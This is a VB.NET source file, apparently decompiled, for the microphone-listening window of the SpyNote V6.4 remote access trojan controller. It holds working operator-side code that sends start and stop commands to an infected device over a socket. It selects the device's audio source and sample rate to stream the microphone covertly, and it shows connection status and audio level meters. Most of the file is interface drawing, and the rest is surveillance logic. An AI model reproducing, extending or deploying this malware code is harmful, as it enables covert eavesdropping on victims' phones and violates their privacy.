Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class Microphone
    Private AudioAPI As Object

    Private aLeft As Integer

    Private aMaster As Integer

    Private aRight As Integer

    Public FP As Long

    Public Bit As Bitmap

    Public TClient As SocketClient

    Public pid As Integer

    Public Packet As Long

    Private col0 As Color

    Private xLO0 As Integer

    Private yLO0 As Integer

    Private wLO0 As Integer

    Private hLO0 As Integer

    Private yalla As Boolean

    Private clrSplit As Color

    Private col1 As Color

    Private xLO1 As Integer

    Private yLO1 As Integer

    Private wLO1 As Integer

    Private hLO1 As Integer

    Private OKY As Boolean

    Private wait0 As Integer

    Private wait1 As Integer
    Public Sub New()
        Me.FP = CLng(0)
        Me.pid = -1
        Me.col0 = Color.FromArgb(255, 32, 146, 255)
        Me.clrSplit = Color.FromArgb(255, 63, 63, 70)
        Me.col1 = Color.FromArgb(255, 32, 146, 255)
        Me.InitializeComponent()
        Me.AudioAPI = New SampleAudioAPI()
        NewLateBinding.LateSet(Me.AudioAPI, Nothing, "OUT_MasterScalar", New Object() {SampleAudioAPI.IntToSinglePercentage(100)}, Nothing, Nothing)
    End Sub
    Private Sub FPTimer_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles FPTimer.Tick
        Me.yalla = True
    End Sub
    Private Sub LBAudioSource_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBAudioSource.Click
        If (Me.SELCT_AS.Items.Count > 0) Then
            Me.SELCT_AS.Width = Me.LBAudioSource.Width + 100
            Me.SELCT_AS.Height = Me.SELCT_SR.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.LBAudioSource.PointToScreen(New System.Drawing.Point(0, 0))
            Dim point As System.Drawing.Point = New System.Drawing.Point(screen.X, screen.Y + Me.LBAudioSource.Height)
            Me.SELCT_AS.Show(point)
        End If
    End Sub

    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub LBSampleRate_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBSampleRate.Click
        If (Me.SELCT_SR.Items.Count > 0) Then
            Me.SELCT_SR.Width = Me.LBSampleRate.Width
            Me.SELCT_SR.Height = Me.SELCT_SR.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.LBSampleRate.PointToScreen(New System.Drawing.Point(0, 0))
            Dim point As System.Drawing.Point = New System.Drawing.Point(screen.X, screen.Y + Me.LBSampleRate.Height)
            Me.SELCT_SR.Show(point)
        End If
    End Sub

    Public Sub ListenMicrophone()
        Me.STALAB.Text = "Stop"
        Me.STALAB.Tag = "1"
        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(9)), Data.SplitData, CStr(Me.LBSampleRate.Tag), Data.SplitData, CStr(Me.LBAudioSource.Tag)}))
    End Sub

    Private Sub Microphone_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        If (Operators.ConditionalCompareObjectEqual(Me.STALAB.Tag, "1", False)) Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(7)), Data.SplitData))
            Me.Packet = CLng(0)
        End If
        If (Me.pid <> -1) Then
            Data.PublicPID = If(Store.FindPID(Me.pid), -1, -2)
        End If
    End Sub

    Private Sub Microphone_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\5.ico"))
        Me.SELCT_SR.Renderer = New ThemeToolStripCmbx()
        Me.SELCT_AS.Renderer = New ThemeToolStripCmbx()
        Me.LBAudioSource.Tag = "Default"
        Me.LBAudioSource.TxText = Conversions.ToString(Operators.ConcatenateObject("Audio Source:", Me.LBAudioSource.Tag))
        Me.LBAudioSource.Refresh()
        Me.LBSampleRate.Tag = "8000"
        Me.LBSampleRate.TxText = Conversions.ToString(Operators.ConcatenateObject("Sample Rate:", Me.LBSampleRate.Tag))
        Me.LBSampleRate.Refresh()
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
        Me.TRefresher.Enabled = True
    End Sub

    Private Sub Microphone_LocationChanged(ByVal sender As Object, ByVal e As EventArgs) Handles Me.LocationChanged
        Me.Panel1.Invalidate()
    End Sub

    Private Sub Microphone_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.Panel1.Invalidate()
    End Sub

    Private Sub Panel1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles Panel1.Paint
        ControlPaint.DrawBorder(e.Graphics, e.ClipRectangle, Me.clrSplit, ButtonBorderStyle.Dashed)
    End Sub
    Private Sub PSoundOutput_Paint(sender As Object, e As PaintEventArgs) Handles PSoundOutput.Paint
        Dim flag As Boolean = Me.aLeft > 0 Or Me.aMaster > 0 Or Me.aRight > 0 Or Me.FP > 0L
        If flag Then
            Dim graphics As Graphics = e.Graphics
            graphics.SmoothingMode = SmoothingMode.AntiAlias
            Dim num As Integer = Me.aMaster
            Dim num2 As Integer = 35 + num
            Dim num3 As Integer = 35 + num
            Dim num4 As Integer = CInt(Math.Round(CDbl(e.ClipRectangle.Width) / 2.0 - CDbl(num2) / 2.0))
            Dim num5 As Integer = CInt(Math.Round(CDbl(e.ClipRectangle.Height) / 2.0 - CDbl(num3) / 2.0))
            Dim white As Brush = Brushes.White
            Dim font As Font = New Font("Consolas", 8.25F, FontStyle.Bold)
            Dim num6 As Integer = 27
            Dim num7 As Integer = CInt(Math.Round(CDbl(num3) / 2.0))
            e.Graphics.DrawString("L" + Conversions.ToString(Me.aLeft), font, white, CSng((num4 - num6 - 10)), CSng((num5 + num7)))
            e.Graphics.DrawString("R" + Conversions.ToString(Me.aRight), font, white, CSng((num4 + Me.aMaster + num6 * 2)), CSng((num5 + num7)))
            Using bitmap As Bitmap = New Bitmap(Me.Bit.Width - 3, Me.Bit.Height - 3)
                Using graphics2 As Graphics = Graphics.FromImage(bitmap)
                    graphics2.SmoothingMode = SmoothingMode.AntiAlias
                    Using textureBrush As TextureBrush = New TextureBrush(Me.Bit)
                        textureBrush.TranslateTransform(0F, 0F)
                        Using graphicsPath As GraphicsPath = New GraphicsPath()
                            graphicsPath.AddEllipse(0, 0, Me.Bit.Width - 5, Me.Bit.Height - 5)
                            graphics2.FillPath(textureBrush, graphicsPath)
                        End Using
                    End Using
                End Using
                graphics.DrawImage(bitmap, New Rectangle(num4, num5, num2, num3))
            End Using
            Dim color As Color = Me.RandomColor1()
            Dim flag2 As Boolean = Me.aMaster > 65
            Dim obj As Object
            If flag2 Then
                obj = New LinearGradientBrush(MyBase.ClientRectangle, Color.FromArgb(50, CInt(color.R), CInt(color.G), CInt(color.B)), Color.FromArgb(80, CInt(color.R), CInt(color.G), CInt(color.B)), LinearGradientMode.ForwardDiagonal)
            Else
                obj = New LinearGradientBrush(MyBase.ClientRectangle, Color.FromArgb(50, 1, 1, 1), Color.FromArgb(80, 1, 1, 1), LinearGradientMode.ForwardDiagonal)
            End If
            Dim ar As Array = New Integer() {num4, num5, num2, num3}
            graphics.FillPath(CType(obj, Brush), DrawCounter.RoundRect(MyBase.ClientRectangle, num, ar))
            Dim pen As Pen = New Pen(If((Me.aMaster > 65), Color.FromArgb(150, CInt(color.R), CInt(color.G), CInt(color.B)), Color.FromArgb(150, 32, 146, 255)), 2.0F)
            Me.col0 = If((Me.aMaster > 65), Color.FromArgb(CInt(Me.col0.A), CInt(color.R), CInt(color.G), CInt(color.B)), Color.FromArgb(CInt(Me.col0.A), 32, 146, 255))
            Me.col1 = If((Me.aMaster > 65), Color.FromArgb(CInt(Me.col1.A), CInt(color.R), CInt(color.G), CInt(color.B)), Color.FromArgb(CInt(Me.col1.A), 32, 146, 255))
            graphics.DrawEllipse(pen, num4, num5, num2, num3)
            Dim flag3 As Boolean = Me.aLeft > 0 Or Me.aMaster > 0 Or Me.aRight > 0 Or Me.FP > 0L
            If flag3 Then
                Dim pen2 As Pen = New Pen(Me.col0, 2.0F)
                graphics.DrawEllipse(pen2, num4 - Me.xLO0, num5 - Me.yLO0, num2 + Me.wLO0 + Me.xLO0, num3 + Me.hLO0 + Me.yLO0)
                Dim flag4 As Boolean = Me.wait0 >= 3
                If flag4 Then
                    Me.col0 = Color.FromArgb(CInt(If((Me.col0.A - 17 < 0), Byte.MaxValue, (Me.col0.A - 17))), CInt(Me.col0.R), CInt(Me.col0.G), CInt(Me.col0.B))
                    Dim flag5 As Boolean = Me.hLO0 >= 5
                    If flag5 Then
                        Me.OKY = True
                    End If
                    Me.wLO0 += 1
                    Me.hLO0 += 1
                    Me.xLO0 += 1
                    Me.yLO0 += 1
                    Me.wait0 = 0
                Else
                    Me.wait0 += 1
                End If
                Dim flag6 As Boolean = Me.hLO0 > 15 And Me.wLO0 > 15 And Me.xLO0 > 15 And Me.yLO0 > 15
                If flag6 Then
                    Me.hLO0 = 0
                    Me.wLO0 = 0
                    Me.xLO0 = 0
                    Me.yLO0 = 0
                End If
                Dim oky As Boolean = Me.OKY
                If oky Then
                    Dim pen3 As Pen = New Pen(Me.col1, 2.0F)
                    graphics.DrawEllipse(pen3, num4 - Me.xLO1, num5 - Me.yLO1, num2 + Me.wLO1 + Me.xLO1, num3 + Me.hLO1 + Me.yLO1)
                    Dim flag7 As Boolean = Me.wait1 >= 3
                    If flag7 Then
                        Me.col1 = Color.FromArgb(CInt(If((Me.col1.A - 17 < 0), Byte.MaxValue, (Me.col1.A - 17))), CInt(Me.col1.R), CInt(Me.col1.G), CInt(Me.col1.B))
                        Me.wLO1 += 1
                        Me.hLO1 += 1
                        Me.xLO1 += 1
                        Me.yLO1 += 1
                        Me.wait1 = 0
                    Else
                        Me.wait1 += 1
                    End If
                    Dim flag8 As Boolean = Me.hLO1 > 15 And Me.wLO1 > 15 And Me.xLO1 > 15 And Me.yLO1 > 15
                    If flag8 Then
                        Me.hLO1 = 0
                        Me.wLO1 = 0
                        Me.xLO1 = 0
                        Me.yLO1 = 0
                    End If
                End If
            Else
                Me.wait0 = 0
                Me.wait1 = 0
                Me.OKY = False
                Me.col0 = Color.FromArgb(255, 32, 146, 255)
                Me.col1 = Color.FromArgb(255, 32, 146, 255)
                Me.hLO0 = 0
                Me.wLO0 = 0
                Me.xLO0 = 0
                Me.yLO0 = 0
                Me.hLO1 = 0
                Me.wLO1 = 0
                Me.xLO1 = 0
                Me.yLO1 = 0
            End If
            Dim flag9 As Boolean = Me.yalla
            If flag9 Then
                Me.FP = 0L
                Me.yalla = False
            End If
        End If
    End Sub
    Private Function RandomColor1() As System.Drawing.Color
        Dim random As System.Random = New System.Random()
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(random.[Next](0, 190), random.[Next](0, 190), random.[Next](0, 190))
        Return color
    End Function

    Private Sub Refresher()
        Me.aLeft = SampleAudioAPI.SingleToIntPercentage(Conversions.ToSingle(NewLateBinding.LateGet(Me.AudioAPI, Nothing, "Value", New Object() {SampleAudioAPI.Channels.OUT_LeftPeak, True}, Nothing, Nothing, Nothing)))
        Me.aMaster = SampleAudioAPI.SingleToIntPercentage(Conversions.ToSingle(NewLateBinding.LateGet(Me.AudioAPI, Nothing, "Value", New Object() {SampleAudioAPI.Channels.OUT_Master, True}, Nothing, Nothing, Nothing)))
        Me.aRight = SampleAudioAPI.SingleToIntPercentage(Conversions.ToSingle(NewLateBinding.LateGet(Me.AudioAPI, Nothing, "Value", New Object() {SampleAudioAPI.Channels.OUT_RightPeak, True}, Nothing, Nothing, Nothing)))
    End Sub

    Private Sub SELCT_AS_Closing(ByVal sender As Object, ByVal e As ToolStripDropDownClosingEventArgs) Handles SELCT_AS.Closing
        Me.LBAudioSource.BordColor = Color.FromArgb(67, 67, 70)
        Me.LBAudioSource.MyArrwColorNone = Color.FromArgb(153, 153, 153)
        Me.LBAudioSource.MylinColorNone = Color.FromArgb(67, 67, 70)
        Me.LBAudioSource.Refresh()
        Me.Panel1.Invalidate()
    End Sub

    Private Sub SELCT_AS_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles SELCT_AS.Opening
        Me.LBAudioSource.BordColor = Color.FromArgb(32, 146, 255)
        Me.LBAudioSource.MyArrwColorNone = Color.FromArgb(32, 146, 255)
        Me.LBAudioSource.MylinColorNone = Color.FromArgb(32, 146, 255)
        Me.LBAudioSource.Refresh()
    End Sub

    Private Sub SELCT_SR_Closing(ByVal sender As Object, ByVal e As ToolStripDropDownClosingEventArgs) Handles SELCT_SR.Closing
        Me.LBSampleRate.BordColor = Color.FromArgb(67, 67, 70)
        Me.LBSampleRate.MyArrwColorNone = Color.FromArgb(153, 153, 153)
        Me.LBSampleRate.MylinColorNone = Color.FromArgb(67, 67, 70)
        Me.LBSampleRate.Refresh()
        Me.Panel1.Invalidate()
    End Sub

    Private Sub SELCT_SR_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles SELCT_SR.Opening
        Me.LBSampleRate.BordColor = Color.FromArgb(32, 146, 255)
        Me.LBSampleRate.MyArrwColorNone = Color.FromArgb(32, 146, 255)
        Me.LBSampleRate.MylinColorNone = Color.FromArgb(32, 146, 255)
        Me.LBSampleRate.Refresh()
    End Sub

    Private Sub SELCTAS(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Me.LBAudioSource.Tag = tag
                Me.LBAudioSource.TxText = String.Concat("Audio Source:", tag)
                Me.LBAudioSource.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub SELCTSR(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Me.LBSampleRate.Tag = tag
                Me.LBSampleRate.TxText = String.Concat("Sample Rate:", tag)
                Me.LBSampleRate.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub STALAB_Click(ByVal sender As Object, ByVal e As EventArgs) Handles STALAB.Click
        Try
            If (Not Operators.ConditionalCompareObjectEqual(Me.STALAB.Tag, "-1", False)) Then
                Me.Packet = CLng(0)
                Me.FPTimer.Enabled = False
                Me.FP = CLng(0)
                Me.STALAB.Tag = "-1"
                Me.STALAB.Text = "Start"
                Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(7)), Data.SplitData))
                If (Me.pid <> -1) Then
                    Data.PublicPID = If(Store.FindPID(Me.pid), -1, -2)
                End If
            Else
                Me.ListenMicrophone()
            End If
            Me.STALAB.Refresh()
        Catch exception As System.Exception
        End Try
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Dim toolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
        Try
            Dim value As String = CStr(Ay.GetValue(1))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0) Then
                Me.LBER.Text = CStr(Ay.GetValue(0))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                If (Operators.ConditionalCompareObjectEqual(Ay.GetValue(0), "OK", False)) Then
                    Dim strArrays() As String = {"8000", "11025", "11025", "22050", "44100"}
                    Me.SELCT_SR.Items.Clear()
                    Dim strArrays1 As String() = strArrays
                    Dim num As Integer = 0
                    While num < CInt(strArrays1.Length)
                        Dim str As String = strArrays1(num)
                        toolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                        {
                            .Text = String.Concat("Rate:", str),
                            .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_SR.Items.Count)),
                            .Tag = str,
                            .ImageScaling = ToolStripItemImageScaling.None
                        }
                        Dim toolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                        AddHandler toolStripMenuItem1.Click, New EventHandler(AddressOf Me.SELCTSR)
                        Me.SELCT_SR.Items.Add(toolStripMenuItem1)
                        num = num + 1
                    End While
                    Dim strArrays2() As String = {"Default", "VOICE_RECOGNITION", "VOICE_COMMUNICATION", "MIC", "CAMCORDER"}
                    Me.SELCT_AS.Items.Clear()
                    Dim strArrays3 As String() = strArrays2
                    Dim num1 As Integer = 0
                    While num1 < CInt(strArrays3.Length)
                        Dim str1 As String = strArrays3(num1)
                        toolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                        {
                            .Text = String.Concat("Source:", str1),
                            .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_SR.Items.Count)),
                            .Tag = str1,
                            .ImageScaling = ToolStripItemImageScaling.None
                        }
                        Dim toolStripMenuItem2 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                        AddHandler toolStripMenuItem2.Click, New EventHandler(AddressOf Me.SELCTAS)
                        Me.SELCT_AS.Items.Add(toolStripMenuItem2)
                        num1 = num1 + 1
                    End While
                    If (Not Me.STALAB.Visible) Then
                        Me.STALAB.Visible = True
                    End If
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(68)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TRefresher_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TRefresher.Tick
        Me.PSoundOutput.Refresh()
        Me.Refresher()
    End Sub


End Class